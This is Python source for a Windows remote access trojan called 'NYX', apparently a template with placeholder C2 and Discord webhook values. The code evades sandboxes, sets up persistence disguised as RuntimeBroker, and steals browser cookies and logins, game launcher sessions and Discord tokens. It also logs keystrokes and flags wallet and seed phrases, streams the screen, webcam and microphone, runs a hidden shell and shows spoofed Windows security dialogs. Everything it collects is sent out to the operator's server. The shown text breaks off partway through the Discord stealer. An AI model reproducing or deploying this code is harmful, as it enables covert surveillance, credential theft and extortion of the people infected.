import os, sys, time, json, base64, threading, subprocess, platform, uuid, io, ctypes, zipfile, tempfile, shutil, re, struct, random, socket, hashlib
from pathlib import Path
from datetime import datetime

WEBHOOK = {{WEBHOOK}}
C2 = {{C2}}
BUILD_ID = {{BUILD_ID}}
OWNER_ID = {{OWNER_ID}}
CLIENT_VERSION = "2.9.0"
PERSISTENCE = {{PERSISTENCE}}
STARTUP_NAME = {{STARTUP_NAME}}
BOOT_DISABLE_TASKMGR = {{BOOT_DISABLE_TASKMGR}}
BOOT_DISABLE_CMD = {{BOOT_DISABLE_CMD}}
BOOT_DISABLE_REGEDIT = {{BOOT_DISABLE_REGEDIT}}
BOOT_WATCHDOG = {{BOOT_WATCHDOG}}
BOOT_AUTO_STEAL = {{BOOT_AUTO_STEAL}}
WATCHDOG_COPIES = {{WATCHDOG_COPIES}}

VID = None
RUNNING = True
KEYLOG_ACTIVE = False
KEYLOG_BUFFER = []
KEYLOG_LOCK = threading.Lock()
SCREEN_STREAM = False
MIC_STREAM = False
WEBCAM_STREAM = False
WEBCAM_IDX = 0
IDLE_ONLY = False
FIRST_DONE = False
CLIPBOARD_ACTIVE = False
CLIPBOARD_LAST = ""
CLIP_HISTORY = []
CLIP_HISTORY_MAX = 40
AUTO_SS_ACTIVE = False
AUTO_SS_INTERVAL = 300
WATCHDOG_ACTIVE = False
ALERT_PATTERNS = ["seed", "mnemonic", "private key", "0x", "password", "passwd", "recovery", "wallet", "metamask", "phantom", "secret"]
CREATE_NO_WINDOW = 0x08000000

def hidden_run(cmd, shell=True, timeout=60):
    try:
        return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, creationflags=CREATE_NO_WINDOW, timeout=timeout).decode("utf-8", errors="ignore")
    except Exception as e:
        return str(e)

def anti_analysis():
    reasons = []
    try:
        import psutil
        if psutil.virtual_memory().total < 2 * 1024**3: reasons.append("low_ram")
        if psutil.cpu_count() is not None and psutil.cpu_count() < 2: reasons.append("low_cpu")
        bad = {"vboxservice","vboxtray","vmtoolsd","vmwaretray","vmwareuser","qemu-ga","xenservice","prl_tools","wireshark","procmon","procmon64","x64dbg","ollydbg","idaq","idaq64","windbg","fiddler","processhacker"}
        for p in psutil.process_iter(["name"]):
            try:
                n = (p.info.get("name") or "").lower().replace(".exe","")
                if n in bad: reasons.append("proc:"+n)
            except Exception: pass
    except Exception: pass
    try:
        import winreg
        for path, val in [(r"SYSTEM\CurrentControlSet\Services\Disk\Enum","0"),(r"HARDWARE\DESCRIPTION\System","SystemBiosVersion")]:
            try:
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                s,_ = winreg.QueryValueEx(k, val)
                if any(x in str(s).lower() for x in ("vbox","vmware","qemu","virtual","virtualbox")): reasons.append("hw")
                winreg.CloseKey(k)
            except Exception: pass
    except Exception: pass
    return reasons

def maybe_exit_sandbox():
    reasons = anti_analysis()
    strong = [r for r in reasons if r.startswith("proc:") or r=="hw"]
    if len(strong) >= 2: sys.exit(0)
    return reasons

def get_vid():
    global VID
    if VID: return VID
    try: node = hex(uuid.getnode())
    except Exception: node = str(random.randint(10**10,10**12))
    raw = f"{platform.node()}-{os.getenv('USERNAME','')}-{node}-{BUILD_ID}"
    VID = hashlib.sha256(raw.encode()).hexdigest()[:16]
    return VID

def system_info():
    try:
        import psutil
        ram = round(psutil.virtual_memory().total/(1024**3),1)
    except Exception: ram = "?"
    return {
        "vid": get_vid(),
        "hostname": platform.node(),
        "user": os.getenv("USERNAME") or os.getenv("USER") or "?",
        "os": platform.platform(),
        "arch": platform.machine(),
        "ram_gb": ram,
        "admin": is_admin(),
        "build": BUILD_ID,
        "version": CLIENT_VERSION,
        "cwd": os.getcwd(),
        "exe": sys.executable if getattr(sys, "frozen", False) else sys.argv[0],
    }

def install_persistence():
    if not PERSISTENCE: return
    try:
        import winreg
        exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
    except Exception:
        pass

def install_machine_persistence():
    """All-users persistence when elevated: copy to ProgramData + HKLM Run + logon task."""
    if not is_admin():
        return {"ok": False, "error": "need admin"}
    results = []
    try:
        src = Path(sys.executable if getattr(sys, "frozen", False) else sys.argv[0])
        dest_dir = Path(os.getenv("PROGRAMDATA", r"C:\ProgramData")) / "Microsoft" / "Windows" / "Services" / "NyxHost"
        dest_dir.mkdir(parents=True, exist_ok=True)
        dest = dest_dir / "RuntimeBroker.exe"
        try:
            shutil.copy2(src, dest)
            results.append(f"copied:{dest}")
        except Exception as e:
            dest = src  # fallback run from current
            results.append(f"copy_fail:{e}")
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, STARTUP_NAME or "WindowsServiceHost", 0, winreg.REG_SZ, f'"{dest}"')
            winreg.CloseKey(key)
            results.append("hklm_run")
        except Exception as e:
            results.append(f"hklm:{e}")
        try:
            task = STARTUP_NAME or "WindowsServiceHost"
            cmd = (
                f'schtasks /Create /TN "{task}" /TR "\"{dest}\"" /SC ONLOGON /RL HIGHEST /F'
            )
            hidden_run(cmd)
            results.append("task_onlogon")
        except Exception as e:
            results.append(f"task:{e}")
        return {"ok": True, "results": results, "path": str(dest)}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def remove_machine_persistence():
    results = []
    try:
        import winreg
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            try:
                winreg.DeleteValue(key, STARTUP_NAME or "WindowsServiceHost")
                results.append("hklm_removed")
            except Exception:
                pass
            winreg.CloseKey(key)
        except Exception as e:
            results.append(f"hklm:{e}")
        try:
            hidden_run(f'schtasks /Delete /TN "{STARTUP_NAME or "WindowsServiceHost"}" /F')
            results.append("task_deleted")
        except Exception as e:
            results.append(str(e))
        return {"ok": True, "results": results}
    except Exception as e:
        return {"ok": False, "error": str(e)}

def list_rat_instances():
    """Find our-looking processes + common drop paths + Run keys."""
    found = {"processes": [], "files": [], "run_keys": [], "notes": []}
    try:
        import psutil
        me = os.getpid()
        for proc in psutil.process_iter(["pid", "name", "exe", "username"]):
            try:
                exe = proc.info.get("exe") or ""
                name = (proc.info.get("name") or "").lower()
                if proc.info.get("pid") == me:
                    found["processes"].append({
                        "pid": me, "name": proc.info.get("name"), "exe": exe,
                        "user": proc.info.get("username"), "self": True,
                    })
                    continue
                # heuristics: same folder themes path, RuntimeBroker in ProgramData Services, our startup name
                low = exe.lower().replace("/", "\\")
                if any(x in low for x in (
                    "themes\\cachedfiles\\system\\drivers",
                    "programdata\\microsoft\\windows\\services\\nyxhost",
                    "inetcache\\ie\\container_",
                )) or name in ("runtimebroker.exe",) and "services\\nyxhost" in low:
                    found["processes"].append({
                        "pid": proc.info.get("pid"), "name": proc.info.get("name"),
                        "exe": exe, "user": proc.info.get("username"), "self": False,
                    })
            except Exception:
                pass
    except Exception as e:
        found["notes"].append(f"psutil:{e}")
    # file locations
    candidates = []
    try:
        app = Path(os.getenv("APPDATA", ""))
        local = Path(os.getenv("LOCALAPPDATA", ""))
        pd = Path(os.getenv("PROGRAMDATA", r"C:\ProgramData"))
        candidates += list((app / "Microsoft" / "Windows" / "Themes" / "CachedFiles" / "System" / "Drivers").glob("ms*.exe")) if (app / "Microsoft").exists() else []
        candidates += list((local / "Microsoft" / "Windows" / "INetCache" / "IE").glob("container_*.exe")) if local.exists() else []
        host = pd / "Microsoft" / "Windows" / "Services" / "NyxHost"
        if host.exists():
            candidates += list(host.glob("*.exe"))
        # current exe
        try:
            candidates.append(Path(sys.executable if getattr(sys, "frozen", False) else sys.argv[0]))
        except Exception:
            pass
        for c in candidates:
            try:
                if c.is_file():
                    found["files"].append({"path": str(c), "size": c.stat().st_size, "mtime": c.stat().st_mtime})
            except Exception:
                pass
    except Exception as e:
        found["notes"].append(str(e))
    # run keys
    try:
        import winreg
        for root, hive in ((winreg.HKEY_CURRENT_USER, "HKCU"), (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            try:
                key = winreg.OpenKey(root, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, val, _ = winreg.EnumValue(key, i)
                        found["run_keys"].append({"hive": hive, "name": name, "value": str(val)})
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            except Exception:
                pass
    except Exception as e:
        found["notes"].append(f"reg:{e}")
    return found

def kill_rat_instance(pid=None, path=None):
    results = []
    if pid:
        try:
            pid = int(pid)
            if pid == os.getpid():
                return {"error": "refusing to kill self via this cmd — use uninstall"}
            hidden_run(f"taskkill /F /PID {pid} /T")
            results.append(f"killed_pid:{pid}")
        except Exception as e:
            results.append(str(e))
    if path:
        try:
            pth = Path(path)
            if pth.is_file():
                try:
                    pth.unlink()
                    results.append(f"deleted:{path}")
                except Exception as e:
                    results.append(f"del_fail:{e}")
        except Exception as e:
            results.append(str(e))
    return {"results": results}

def pack_browser_profile(browser="chrome"):
    """Copy Local State + Cookies + Login Data for offline decrypt (Chrome/Edge/Opera)."""
    local = Path(os.getenv("LOCALAPPDATA", ""))
    app = Path(os.getenv("APPDATA", ""))
    map_ = {
        "chrome": local / "Google" / "Chrome" / "User Data",
        "edge": local / "Microsoft" / "Edge" / "User Data",
        "brave": local / "BraveSoftware" / "Brave-Browser" / "User Data",
        "opera": app / "Opera Software" / "Opera Stable",
        "operagx": app / "Opera Software" / "Opera GX Stable",
        "firefox": app / "Mozilla" / "Firefox" / "Profiles",
    }
    key = (browser or "chrome").lower().replace(" ", "")
    root = map_.get(key)
    if not root or not root.exists():
        return None, {"error": f"path missing for {key}", "tried": str(root)}
    tmp = Path(tempfile.mkdtemp(prefix="nyx_prof_"))
    try:
        # kill first helps
        kill_browsers(key if key != "operagx" else "opera")
        time.sleep(1.0)
        copied = []
        if key == "firefox":
            for prof in root.iterdir():
                if not prof.is_dir():
                    continue
                for fn in ("cookies.sqlite", "logins.json", "key4.db", "places.sqlite"):
                    src = prof / fn
                    if src.exists():
                        dest = tmp / f"{prof.name}_{fn}"
                        try:
                            shutil.copy2(src, dest)
                            copied.append(dest.name)
                        except Exception:
                            db = _copy_locked_db(src)
                            if db:
                                shutil.copy2(db, dest)
                                copied.append(dest.name)
        else:
            # Local State at root
            for fn in ("Local State",):
                src = root / fn
                if src.exists():
                    try:
                        shutil.copy2(src, tmp / fn.replace(" ", "_"))
                        copied.append(fn)
                    except Exception:
                        pass
            profiles = []
            try:
                for d in root.iterdir():
                    if d.is_dir() and (d.name == "Default" or d.name.startswith("Profile")):
                        profiles.append(d)
            except Exception:
                pass
            if not profiles and key.startswith("opera"):
                profiles = [root]
            for prof in profiles[:6]:
                for rel in (
                    Path("Network") / "Cookies",
                    Path("Cookies"),
                    Path("Login Data"),
                    Path("Login Data For Account"),
                ):
                    src = prof / rel
                    if src.exists():
                        dest = tmp / f"{prof.name}_{rel.name}".replace(" ", "_")
                        db = _copy_locked_db(src)
                        if db:
                            try:
                                shutil.copy2(db, dest)
                                copied.append(dest.name)
                                try:
                                    db.unlink()
                                except Exception:
                                    pass
                            except Exception:
                                pass
        if not copied:
            return None, {"error": "nothing copied — browser still locked?", "root": str(root)}
        zpath = Path(tempfile.gettempdir()) / f"profile_{key}_{random.randint(1000,9999)}.zip"
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
            for f in tmp.iterdir():
                z.write(f, f.name)
        data = base64.b64encode(zpath.read_bytes()).decode()
        try:
            zpath.unlink()
        except Exception:
            pass
        return data, {"browser": key, "files": copied, "root": str(root)}
    finally:
        shutil.rmtree(tmp, ignore_errors=True)



def discord_webhook(msg, ping_everyone=True):
    if not WEBHOOK or "discord.com" not in WEBHOOK: return
    try:
        import requests
        content = msg[:1900]
        if ping_everyone and "@everyone" not in content:
            content = "@everyone\n" + content
        requests.post(WEBHOOK, json={
            "content": content,
            "allowed_mentions": {"parse": ["everyone"]}
        }, timeout=10)
    except Exception: pass

def notify_new_victim(info, reasons):
    host = info.get("hostname") or "?"
    user = info.get("user") or "?"
    osn = (info.get("os") or "?")[:60]
    admin = "YES" if info.get("admin") else "no"
    ram = info.get("ram_gb", "?")
    vid = get_vid()
    msg = (
        "════ **NYX · NEW SESSION** ════\n"
        f"**Host** `{host}`\n"
        f"**User** `{user}` · admin `{admin}`\n"
        f"**OS** `{osn}`\n"
        f"**RAM** `{ram} GB`\n"
        f"**VID** `{vid}`\n"
        f"**Anti-VM** `{reasons or 'clean'}`\n"
        f"**C2** `{C2}`"
    )
    discord_webhook(msg)

def notify_keylog_alert(hits, text):
    msg = (
        "════ **NYX · KEYLOG HIT** ════\n"
        f"**VID** `{get_vid()[:12]}`\n"
        f"**Matched** `{', '.join(hits)}`\n"
        f"```\n{(text or '')[:500]}\n```"
    )
    discord_webhook(msg)

def notify_ransom(res):
    msg = (
        "════ **NYX · RANSOM** ════\n"
        f"**Host** `{system_info().get('hostname')}`\n"
        f"**Result** `{res}`"
    )
    discord_webhook(msg)

def send_loot(loot_type, data):
    try:
        import requests
        requests.post(f"{C2}/api/loot", json={"vid":get_vid(),"type":loot_type,"data":data,"ts":datetime.utcnow().isoformat()+"Z"}, timeout=30)
    except Exception: pass

def checkin(first=False):
    try:
        import requests
        r = requests.post(f"{C2}/api/checkin", json={"vid":get_vid(),"info":system_info(),"first":first,"build":BUILD_ID,"owner_id":OWNER_ID}, timeout=15)
        if r.status_code==200: return r.json()
    except Exception: pass
    return {"commands":[]}


def _monitor_rects():
    """List of (left, top, right, bottom) for each monitor. Primary first when possible."""
    rects = []
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.windll.user32
        class RECT(ctypes.Structure):
            _fields_ = [("left", wintypes.LONG), ("top", wintypes.LONG),
                        ("right", wintypes.LONG), ("bottom", wintypes.LONG)]
        MONITORENUMPROC = ctypes.WINFUNCTYPE(
            wintypes.BOOL, wintypes.HMONITOR, wintypes.HDC, ctypes.POINTER(RECT), wintypes.LPARAM
        )
        def _cb(hmon, hdc, lprect, lparam):
            r = lprect.contents
            rects.append((r.left, r.top, r.right, r.bottom))
            return 1
        user32.EnumDisplayMonitors(0, 0, MONITORENUMPROC(_cb), 0)
    except Exception:
        pass
    if not rects:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            rects = [(0, 0, img.width, img.height)]
        except Exception:
            rects = [(0, 0, 1920, 1080)]
    return rects

def _foreground_rect():
    try:
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        if not hwnd:
            return None
        rect = wintypes.RECT()
        if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
            return None
        # skip minimized / tiny
        w = rect.right - rect.left
        h = rect.bottom - rect.top
        if w < 80 or h < 80:
            return None
        return (rect.left, rect.top, rect.right, rect.bottom)
    except Exception:
        return None

SCREEN_TARGET = "primary"  # primary | monitor:0 | monitor:1 | active

def take_screenshot(quality=40, max_width=1600, target=None):
    """target: primary | active | monitor:N | None uses SCREEN_TARGET."""
    global SCREEN_TARGET
    try:
        from PIL import ImageGrab, Image
        tgt = target if target is not None else SCREEN_TARGET
        bbox = None
        if tgt == "active":
            bbox = _foreground_rect()
        elif isinstance(tgt, str) and tgt.startswith("monitor:"):
            try:
                idx = int(tgt.split(":", 1)[1])
            except Exception:
                idx = 0
            mons = _monitor_rects()
            if mons:
                idx = max(0, min(idx, len(mons) - 1))
                bbox = mons[idx]
        elif tgt == "all":
            bbox = None
            try:
                img = ImageGrab.grab(all_screens=True)
            except TypeError:
                img = ImageGrab.grab()
            if max_width and img.width > max_width:
                ratio = max_width / float(img.width)
                img = img.resize((max_width, max(1, int(img.height * ratio))), Image.BILINEAR)
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=quality, optimize=True)
            return base64.b64encode(buf.getvalue()).decode()
        # primary / fallback
        if bbox is None and tgt != "active":
            mons = _monitor_rects()
            bbox = mons[0] if mons else None
        if bbox is not None:
            # ImageGrab.bbox is (left, top, right, bottom)
            img = ImageGrab.grab(bbox=bbox)
        else:
            img = ImageGrab.grab()
        if max_width and img.width > max_width:
            ratio = max_width / float(img.width)
            img = img.resize((max_width, max(1, int(img.height * ratio))), Image.BILINEAR)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality, optimize=True)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"err:{e}"

def is_idle(seconds=60):
    try:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize",ctypes.c_uint),("dwTime",ctypes.c_uint)]
        lii = LASTINPUTINFO(); lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        return (ctypes.windll.kernel32.GetTickCount()-lii.dwTime) >= seconds*1000
    except Exception: return False

def screen_stream_loop():
    global SCREEN_STREAM
    fail = 0
    while SCREEN_STREAM and RUNNING:
        try:
            if IDLE_ONLY and not is_idle(45):
                time.sleep(1.2)
                continue
            data = take_screenshot(quality=50, max_width=1440)
            if data and not str(data).startswith("err"):
                send_loot("screen_frame", data)
                fail = 0
            else:
                fail += 1
                if fail >= 5:
                    send_loot("status", f"screen grab fail: {data}")
                    fail = 0
        except Exception as e:
            fail += 1
            if fail >= 5:
                send_loot("status", f"screen err: {e}")
                fail = 0
        time.sleep(0.22)


def list_webcams(max_idx=6):
    cams=[]
    try:
        import cv2
        for i in range(max_idx):
            cap=cv2.VideoCapture(i)
            if cap.isOpened():
                ret,_=cap.read()
                if ret: cams.append({"index":i,"name":f"Camera {i}"})
                cap.release()
    except Exception as e: return [{"error":str(e)}]
    return cams

def webcam_snap(idx=0):
    try:
        import cv2
        cap=cv2.VideoCapture(int(idx), cv2.CAP_DSHOW) if hasattr(cv2,'CAP_DSHOW') else cv2.VideoCapture(int(idx)); ret,frame=cap.read(); cap.release()
        if ret:
            _,buf=cv2.imencode(".jpg",frame,[int(cv2.IMWRITE_JPEG_QUALITY),65])
            return base64.b64encode(buf.tobytes()).decode()
    except Exception as e: return str(e)
    return None

def webcam_stream_loop():
    global WEBCAM_STREAM
    while WEBCAM_STREAM and RUNNING:
        try:
            data=webcam_snap(WEBCAM_IDX)
            if data and len(str(data))>100: send_loot("webcam_frame", data)
        except Exception: pass
        time.sleep(0.6)

def check_alert_patterns(text):
    low=text.lower()
    hits=[p for p in ALERT_PATTERNS if p in low]
    if hits: notify_keylog_alert(hits, text)

def keylogger_worker():
    global KEYLOG_ACTIVE, KEYLOG_BUFFER
    try:
        from pynput import keyboard
        def on_press(key):
            if not KEYLOG_ACTIVE: return False
            try:
                with KEYLOG_LOCK:
                    if hasattr(key,"char") and key.char: KEYLOG_BUFFER.append(key.char)
                    else:
                        name=getattr(key,"name",str(key))
                        if name=="space": KEYLOG_BUFFER.append(" ")
                        elif name=="enter": KEYLOG_BUFFER.append("\n")
                        elif name=="tab": KEYLOG_BUFFER.append("\t")
                        else: KEYLOG_BUFFER.append(f"[{name}]")
                    if len(KEYLOG_BUFFER)>80:
                        chunk="".join(KEYLOG_BUFFER); KEYLOG_BUFFER.clear()
                        send_loot("keylog", chunk); check_alert_patterns(chunk)
            except Exception: pass
        with keyboard.Listener(on_press=on_press) as listener: listener.join()
    except Exception as e: send_loot("status", f"keylog fail: {e}")

def keylog_flush(clear_only=False):
    global KEYLOG_BUFFER
    with KEYLOG_LOCK:
        if KEYLOG_BUFFER and not clear_only:
            chunk="".join(KEYLOG_BUFFER); KEYLOG_BUFFER.clear()
            send_loot("keylog", chunk); check_alert_patterns(chunk)
        else:
            KEYLOG_BUFFER.clear()
    if clear_only:
        send_loot("keylog_clear", "1")
        send_loot("status", "keylog cleared")

def reverse_shell(cmd):
    """Hidden cmd.exe shell with timeout."""
    return hidden_run(cmd, timeout=120)

def run_powershell(ps_cmd, timeout=120, encoded=True):
    """Reliable PowerShell runner.
    Uses -EncodedCommand (UTF-16LE base64) so quotes/newlines/ampersands never break.
    Falls back to -File temp script if needed.
    """
    try:
        import base64 as _b64
        # strip outer quotes the panel sometimes adds
        ps = (ps_cmd or "").strip()
        if len(ps) >= 2 and ((ps[0] == ps[-1] == '"') or (ps[0] == ps[-1] == "'")):
            ps = ps[1:-1]
        if encoded and ps:
            # UTF-16LE is what powershell -EncodedCommand expects
            b64 = _b64.b64encode(ps.encode("utf-16le")).decode("ascii")
            full = (
                'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden '
                f'-ExecutionPolicy Bypass -EncodedCommand {b64}'
            )
            out = hidden_run(full, timeout=timeout)
            if out and "is not recognized" not in out.lower():
                return out
        # fallback: write temp .ps1 and -File it
        sp = Path(tempfile.gettempdir()) / f"nyx_{random.randint(10000,99999)}.ps1"
        try:
            sp.write_text(ps, encoding="utf-8")
            full = (
                'powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden '
                f'-ExecutionPolicy Bypass -File "{sp}"'
            )
            return hidden_run(full, timeout=timeout)
        finally:
            try:
                sp.unlink()
            except Exception:
                pass
    except Exception as e:
        return f"ps err: {e}"




def kill_browsers(which=None):
    """Force-close browsers (taskkill + wmic fallback)."""
    names = {
        "chrome": ["chrome.exe", "chrome_proxy.exe", "GoogleCrashHandler.exe"],
        "edge": ["msedge.exe", "msedgewebview2.exe"],
        "opera": ["opera.exe", "opera_crashreporter.exe"],
        "brave": ["brave.exe"],
        "firefox": ["firefox.exe", "plugin-container.exe"],
        "vivaldi": ["vivaldi.exe"],
        "yandex": ["browser.exe"],
        "discord": ["Discord.exe"],
    }
    if which:
        key = str(which).lower().strip()
        targets = list(names.get(key, [key if key.endswith(".exe") else key + ".exe"]))
    else:
        targets = []
        for v in names.values():
            targets.extend(v)
        targets = list(dict.fromkeys(targets))
    results = []
    for exe in targets:
        try:
            r = subprocess.run(
                ["taskkill", "/F", "/IM", exe, "/T"],
                capture_output=True, text=True, timeout=15,
                creationflags=CREATE_NO_WINDOW,
            )
            out = (r.stdout or "") + (r.stderr or "")
            if r.returncode == 0 or "SUCCESS" in out.upper():
                results.append(f"ok:{exe}")
            elif "not found" in out.lower() or "not running" in out.lower():
                pass
            else:
                # wmic fallback
                subprocess.run(
                    f'wmic process where "name=\'{exe}\'" call terminate',
                    shell=True, capture_output=True, timeout=15,
                    creationflags=CREATE_NO_WINDOW,
                )
                results.append(f"wmic:{exe}")
        except Exception as e:
            results.append(f"err:{exe}:{e}")
    time.sleep(0.8)
    return {"killed": results, "count": len(results)}




def mic_list():
    devs = []
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        for i in range(p.get_device_count()):
            info = p.get_device_info_by_index(i)
            if int(info.get("maxInputChannels") or 0) > 0:
                devs.append({
                    "index": i,
                    "name": info.get("name"),
                    "channels": info.get("maxInputChannels"),
                    "rate": int(info.get("defaultSampleRate") or 44100),
                })
        p.terminate()
    except Exception as e:
        devs.append({"error": "pyaudio: " + str(e), "hint": "pip install pyaudio on build PC"})
    return devs or [{"error": "no input devices"}]

def mic_record(seconds=8, device_index=None):
    seconds = max(1, min(30, int(seconds or 8)))
    try:
        import pyaudio
        import wave
        p = pyaudio.PyAudio()
        rate, ch = 16000, 1
        kwargs = dict(format=pyaudio.paInt16, channels=ch, rate=rate, input=True, frames_per_buffer=1024)
        if device_index is not None:
            kwargs["input_device_index"] = int(device_index)
        stream = p.open(**kwargs)
        frames = []
        for _ in range(0, int(rate / 1024 * seconds)):
            frames.append(stream.read(1024, exception_on_overflow=False))
        stream.stop_stream()
        stream.close()
        p.terminate()
        buf = io.BytesIO()
        with wave.open(buf, "wb") as w:
            w.setnchannels(ch)
            w.setsampwidth(2)
            w.setframerate(rate)
            w.writeframes(b"".join(frames))
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return "err:" + str(e)

MIC_STREAM = False

def mic_stream_loop(device_index=None):
    global MIC_STREAM
    try:
        import pyaudio
        import wave
        p = pyaudio.PyAudio()
        rate, ch = 16000, 1
        kwargs = dict(format=pyaudio.paInt16, channels=ch, rate=rate, input=True, frames_per_buffer=1024)
        if device_index is not None:
            kwargs["input_device_index"] = int(device_index)
        stream = p.open(**kwargs)
        while MIC_STREAM and RUNNING:
            frames = []
            for _ in range(0, int(rate / 1024 * 1.0)):
                if not MIC_STREAM:
                    break
                frames.append(stream.read(1024, exception_on_overflow=False))
            if not frames:
                continue
            buf = io.BytesIO()
            with wave.open(buf, "wb") as w:
                w.setnchannels(ch)
                w.setsampwidth(2)
                w.setframerate(rate)
                w.writeframes(b"".join(frames))
            send_loot("mic_chunk", base64.b64encode(buf.getvalue()).decode())
        stream.stop_stream()
        stream.close()
        p.terminate()
    except Exception as e:
        send_loot("status", "mic stream err: " + str(e))
    MIC_STREAM = False
    send_loot("status", "mic stream off")



def clip_history_get():
    return list(CLIP_HISTORY)

def process_freeze(pid):
    try:
        pid = int(pid)
        import ctypes
        PROCESS_SUSPEND_RESUME = 0x0800
        h = ctypes.windll.kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
        if not h:
            return f"open fail pid={pid}"
        ntdll = ctypes.windll.ntdll
        r = ntdll.NtSuspendProcess(h)
        ctypes.windll.kernel32.CloseHandle(h)
        return f"suspended pid={pid} nt={r}"
    except Exception as e:
        return str(e)

def process_thaw(pid):
    try:
        pid = int(pid)
        import ctypes
        PROCESS_SUSPEND_RESUME = 0x0800
        h = ctypes.windll.kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
        if not h:
            return f"open fail pid={pid}"
        r = ctypes.windll.ntdll.NtResumeProcess(h)
        ctypes.windll.kernel32.CloseHandle(h)
        return f"resumed pid={pid} nt={r}"
    except Exception as e:
        return str(e)

def steal_launcher_sessions():
    """Steam / Epic / Riot session-ish files."""
    out = {"steam": [], "epic": [], "riot": [], "notes": []}
    local = Path(os.getenv("LOCALAPPDATA", ""))
    app = Path(os.getenv("APPDATA", ""))
    pf = Path(os.getenv("PROGRAMFILES(X86)", r"C:\Program Files (x86)"))
    # Steam
    steam = pf / "Steam"
    for rel in ["config/loginusers.vdf", "config/config.vdf", "ssfn*"]:
        try:
            if "*" in rel:
                for f in (steam / "config").glob("ssfn*") if (steam / "config").exists() else []:
                    out["steam"].append(str(f))
            else:
                f = steam / rel
                if f.exists():
                    out["steam"].append(str(f))
        except Exception as e:
            out["notes"].append(f"steam:{e}")
    # also userdata
    try:
        ud = steam / "userdata"
        if ud.exists():
            for f in ud.rglob("ssfn*"):
                out["steam"].append(str(f))
            for f in list(ud.rglob("loginusers.vdf"))[:5]:
                out["steam"].append(str(f))
    except Exception:
        pass
    # Epic
    epic = local / "EpicGamesLauncher" / "Saved"
    if epic.exists():
        for f in epic.rglob("*"):
            if f.is_file() and f.suffix.lower() in (".json", ".ini", ".dat", ".config") and f.stat().st_size < 2_000_000:
                if any(x in f.name.lower() for x in ("game", "user", "token", "config", "login", "account")):
                    out["epic"].append(str(f))
        out["epic"] = out["epic"][:40]
    # Riot
    riot = local / "Riot Games"
    if riot.exists():
        for f in riot.rglob("*"):
            if f.is_file() and f.stat().st_size < 2_000_000:
                n = f.name.lower()
                if any(x in n for x in ("session", "token", "auth", "cookie", "riotgames", "credentials", "private")):
                    out["riot"].append(str(f))
        out["riot"] = out["riot"][:40]
    # pack small files into zip b64
    try:
        tmp = Path(tempfile.mkdtemp(prefix="nyx_ln_"))
        for label, paths in (("steam", out["steam"]), ("epic", out["epic"]), ("riot", out["riot"])):
            for i, sp in enumerate(paths[:25]):
                try:
                    src = Path(sp)
                    if src.is_file() and src.stat().st_size < 1_500_000:
                        dest = tmp / f"{label}_{i}_{src.name}"
                        shutil.copy2(src, dest)
                except Exception:
                    pass
        zpath = Path(tempfile.gettempdir()) / f"launchers_{random.randint(1000,9999)}.zip"
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
            for f in tmp.iterdir():
                z.write(f, f.name)
        out["b64_zip"] = base64.b64encode(zpath.read_bytes()).decode()
        out["zip_size"] = zpath.stat().st_size
        try:
            zpath.unlink()
        except Exception:
            pass
        shutil.rmtree(tmp, ignore_errors=True)
    except Exception as e:
        out["notes"].append(f"zip:{e}")
    return out

def notify_spoof(title="Windows Security", text="Your PC needs a restart to finish installing updates.", kind="info"):
    """Balloon / MessageBox spoof."""
    try:
        # message box
        flags = {"info": 0x40, "warn": 0x30, "error": 0x10, "quest": 0x20}.get(str(kind), 0x40)
        ctypes.windll.user32.MessageBoxW(0, str(text)[:500], str(title)[:120], flags | 0x1000)  # system modal-ish
        return "msgbox ok"
    except Exception as e:
        return str(e)


def steal_discord():
    """Find Discord tokens in desktop apps + browsers; keep only API-valid (active) ones."""
    out = {"tokens": [], "hq": [], "notes": [], "paths_scanned": 0, "raw_hits": 0}
    try:
        base = Path(os.getenv("APPDATA", "") or "")
        local = Path(os.getenv("LOCALAPPDATA", "") or "")
        # desktop clients + browser Local Storage / Session / IndexedDB-ish
        roots = []
        for name in ("discord", "discordcanary", "discordptb", "discorddevelopment", "Lightcord", "Vencord"):
            for sub in (
                Path("Local Storage") / "leveldb",
                Path("Session Storage"),
                Path("Local Storage"),
            ):
                roots.append(base / name / sub)
        # chromium profiles
        chromes = [
            local / "Google" / "Chrome" / "User Data",
            local / "Google" / "Chrome Beta" / "User Data",
            local / "Microsoft" / "Edge" / "User Data",
